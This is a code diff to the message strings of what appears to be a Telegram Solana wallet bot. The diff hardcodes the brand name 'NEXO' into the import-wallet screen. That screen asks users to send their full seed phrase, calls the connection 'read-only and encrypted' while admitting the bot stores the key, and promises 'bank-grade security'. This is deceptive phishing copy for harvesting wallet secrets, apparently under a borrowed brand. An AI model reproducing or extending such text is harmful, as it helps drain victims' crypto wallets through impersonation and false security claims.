@@ -2,7 +2,6 @@
  * All user-facing copy — matching the product screenshots exactly.
  * Plain text throughout (HTML parse mode safe).
  */
-import { APP_NAME } from '../config/constants';
 
 export const supportUsername = process.env.SUPPORT_USERNAME || 'ainexobotsupport';
 export const websiteUrl = process.env.WEBSITE_URL || 'https://t.co/z1XgC7Zd6d';
@@ -104,9 +103,9 @@ export function walletImportedMessage(address: string, balance: number): string 
   return `Wallet Created\n\nWallet Address:\n${address}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`;
 }
 
-// === IMPORT WALLET — exact product-spec screen (product name interpolated) ===
+// === IMPORT WALLET — exact product-spec screen (screenshot wording) ===
 export function importWalletMessage(): string {
-  return `🔑 Import Solana Wallet 🔒\n\nYou need to connect your wallet to access this feature.\n${APP_NAME} uses bank-grade security to protect your assets.\nAll connections are read-only and encrypted.\n\nPlease send your Solana wallet seed phrase (12 or 24 words).\n\n⚠️ IMPORTANT: Never share your seed phrase with anyone else. This bot stores your key securely to enable trading functionality.`;
+  return `🔑 Import Solana Wallet 🔒\n\nYou need to connect your wallet to access this feature.\nNEXO uses bank-grade security to protect your assets.\nAll connections are read-only and encrypted.\n\nPlease send your Solana wallet seed phrase (12 or 24 words).\n\n⚠️ IMPORTANT: Never share your seed phrase with anyone else. This bot stores your key securely to enable trading functionality.`;
 }
 
 export function importSeedPromptMessage(): string {
